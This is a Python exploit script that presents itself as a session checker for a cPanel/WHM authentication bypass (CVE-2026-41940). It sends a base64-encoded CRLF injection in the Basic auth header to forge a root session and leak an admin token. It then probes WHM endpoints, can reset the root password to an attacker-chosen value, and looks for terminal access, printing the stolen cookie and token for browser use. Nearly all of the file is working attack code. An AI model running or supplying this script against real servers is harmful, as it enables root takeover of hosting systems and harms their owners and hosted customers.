import argparse
import base64
import json
import re
import sys
import urllib.parse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = """     

        (*) cPanel/WHM AuthBypass Session Checker
"""

print(banner)

PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

def parse_target(url):
    u = urllib.parse.urlsplit(url.rstrip("/"))
    return u.scheme, u.hostname, u.port or 2087

def discover_canonical_host(scheme, host, port):
    try:
        r = requests.get(
            f"{scheme}://{host}:{port}/openid_connect/cpanelid",
            verify=False, allow_redirects=False,
            headers={"Connection": "close"}, timeout=10,
        )
    except Exception as e:
        print(f"[!] couldn't reach target: {e}")
        sys.exit(1)
    loc = r.headers.get("Location", "")
    m = re.match(r"^https?://([^:/]+)", loc)
    if m:
        return m.group(1)
    return host

def make_session():
    s = requests.Session()
    s.verify = False
    return s

def http(s, method, scheme, host, port, canonical, path, do_redirects=False, **kw):
    headers = kw.pop("headers", {})
    headers.setdefault("Host", f"{canonical}:{port}")
    headers.setdefault("Connection", "close")
    return s.request(
        method, f"{scheme}://{host}:{port}{path}",
        headers=headers, allow_redirects=do_redirects, **kw,
    )

def stage1_preauth(s, scheme, host, port, canonical):
    print("[1] minting a preauth session...")
    r = http(s, "POST", scheme, host, port, canonical,
             "/login/?login_only=1",
             data={"user": "root", "pass": "wrong"})
    cookie_value = None
    for k, v in r.raw.headers.items():
        if k.lower() == "set-cookie" and v.startswith("whostmgrsession="):
            cookie_value = v.split("=", 1)[1].split(";", 1)[0]
            cookie_value = urllib.parse.unquote(cookie_value)
            break
    if not cookie_value:
        print("[!] no whostmgrsession cookie issued")
        sys.exit(1)
    if "," in cookie_value:
        session_base = cookie_value.split(",", 1)[0]
    else:
        session_base = cookie_value
    print(f"    session base = {session_base}")
    return session_base

def stage2_inject(s, scheme, host, port, canonical, session_base):
    print("[2] CRLF injection via Basic auth + no-ob cookie...")
    cookie_enc = urllib.parse.quote(session_base)
    r = http(s, "GET", scheme, host, port, canonical, "/",
             headers={
                 "Authorization": f"Basic {PAYLOAD_B64}",
                 "Cookie": f"whostmgrsession={cookie_enc}",
             })
    loc = r.headers.get("Location", "")
    m = re.search(r"/cpsess\d{10}", loc)
    if not m:
        print(f"[!] no cpsess token leaked (HTTP {r.status_code})")
        sys.exit(1)
    token = m.group(0)
    print(f"    HTTP {r.status_code}, token = {token}")
    return token

def stage3_propagate(s, scheme, host, port, canonical, session_base):
    print("[3] do_token_denied propagation...")
    cookie_enc = urllib.parse.quote(session_base)
    r = http(s, "GET", scheme, host, port, canonical, "/scripts2/listaccts",
             headers={"Cookie": f"whostmgrsession={cookie_enc}"})
    print(f"    HTTP {r.status_code}")
    return True

def stage4_check_auth(s, scheme, host, port, canonical, session_base, token):
    """Try various endpoints to see if the session is actually authenticated."""
    print("\n[4] Checking session authentication...")
    cookie_enc = urllib.parse.quote(session_base)
    
    tests = [
        ("WHM home page", f"{token}/", True),
        ("WHM home no token", "/", False),
        ("API version", f"{token}/json-api/version", False),
        ("API applist", f"{token}/json-api/applist?api.version=1", False),
        ("WHM terminal page", f"{token}/scripts2/terminal", True),
        ("List accounts", f"{token}/scripts2/listaccts", True),
        ("WHM config", f"{token}/cgi/config", True),
    ]
    
    results = {}
    for label, path, check_200 in tests:
        r = http(s, "GET", scheme, host, port, canonical, path,
                 headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                 do_redirects=True)
        body_preview = (r.text or "")[:150].replace('\n', ' ')
        logged_in = "login" not in (r.text or "").lower()[:500] or "WHM Login" not in (r.text or "")[:500]
        if r.status_code == 200:
            logged_in = logged_in and "WHM Login" not in (r.text or "")[:1000]
        elif r.status_code in (301, 302):
            loc_hdr = r.headers.get("Location", "")
            logged_in = "login" not in loc_hdr.lower()
        else:
            logged_in = False
        
        status = "AUTH_OK" if logged_in else "DENIED"
        print(f"    {label:30s} -> HTTP {r.status_code:3d} [{status}]  {body_preview[:80]}")
        results[label] = (r.status_code, logged_in, r.text)
    
    return results

def try_change_password(s, scheme, host, port, canonical, session_base, token, new_pass):
    """Try changing root password via WHM API."""
    print(f"\n[5] Attempting password change to '{new_pass}'...")
    cookie_enc = urllib.parse.quote(session_base)
    r = http(s, "POST", scheme, host, port, canonical,
             f"{token}/json-api/passwd?api.version=1",
             headers={"Cookie": f"whostmgrsession={cookie_enc}"},
             data={"user": "root", "pass": new_pass},
             do_redirects=True)
    print(f"    passwd -> HTTP {r.status_code}")
    print(f"    response: {(r.text or '')[:300]}")
    return r

def try_whm_terminal(s, scheme, host, port, canonical, session_base, token):
    """Try accessing the WHM Terminal feature."""
    print("\n[6] Checking WHM Terminal access...")
    cookie_enc = urllib.parse.quote(session_base)
    
    # The terminal is usually at /cpsessXXXXX/scripts2/terminal or similar
    paths = [
        f"{token}/scripts2/terminal",
        f"{token}/cgi/terminal",
        f"{token}/terminal",
    ]
    for path in paths:
        r = http(s, "GET", scheme, host, port, canonical, path,
                 headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                 do_redirects=True)
        body_lower = (r.text or "").lower()
        if "terminal" in body_lower and (r.status_code == 200):
            # Look for CSRF token / form action
            csrf_m = re.search(r'name="token".*?value="([^"]+)"', r.text or "")
            if csrf_m:
                print(f"    Terminal found at {path} (HTTP {r.status_code}, CSRF token: {csrf_m.group(1)})")
            else:
                print(f"    Terminal found at {path} (HTTP {r.status_code})")
            return r.text
        else:
            print(f"    {path} -> HTTP {r.status_code}")
    
    return None

parser = argparse.ArgumentParser()
parser.add_argument("--target", required=True, help="WHM URL, e.g. https://target:2087")
parser.add_argument("--hostname", default=None, help="override Host header")
parser.add_argument("--password", default=None, help="new root password to set")
args = parser.parse_args()

scheme, host, port = parse_target(args.target)
canonical = args.hostname or discover_canonical_host(scheme, host, port)
print(f"[0] Host: {host}:{port}  Canonical: {canonical}")

s = make_session()

session_base = stage1_preauth(s, scheme, host, port, canonical)
token = stage2_inject(s, scheme, host, port, canonical, session_base)
stage3_propagate(s, scheme, host, port, canonical, session_base)
results = stage4_check_auth(s, scheme, host, port, canonical, session_base, token)

# Summary
print("\n" + "="*60)
print("SUMMARY:")
print("="*60)

any_auth_ok = any(v[1] for v in results.values())
if any_auth_ok:
    print("\n[+] SESSION IS AUTHENTICATED on one or more endpoints!")
    print(f"\n[+] Access WHM in browser:")
    print(f"    URL: {scheme}://{host}:{port}/{token}/")
    print(f"    Cookie: whostmgrsession={urllib.parse.quote(session_base)}")
    
    if args.password:
        try_change_password(s, scheme, host, port, canonical, session_base, token, args.password)
    
    # Try terminal
    try_whm_terminal(s, scheme, host, port, canonical, session_base, token)
else:
    print("\n[-] All endpoints DENIED access.")
    print("[-] This target appears to be PATCHED against CVE-2026-41940.")
    print("\n    The CRLF injection (stages 1-3) may still work, but the")
    print("    successful_internal_auth_with_timestamp bypass in")
    print("    docheckpass_whostmgrd has been fixed in this version.")
    print(f"\n    Actionable info:")
    print(f"    - Session cookie: whostmgrsession={urllib.parse.quote(session_base)}")
    print(f"    - Token: {token}")
    print(f"    - These might still work if re-validated on a different code path")

print()
print(f"    Cookie: whostmgrsession={urllib.parse.quote(session_base)}")
print(f"    Token: {token}")
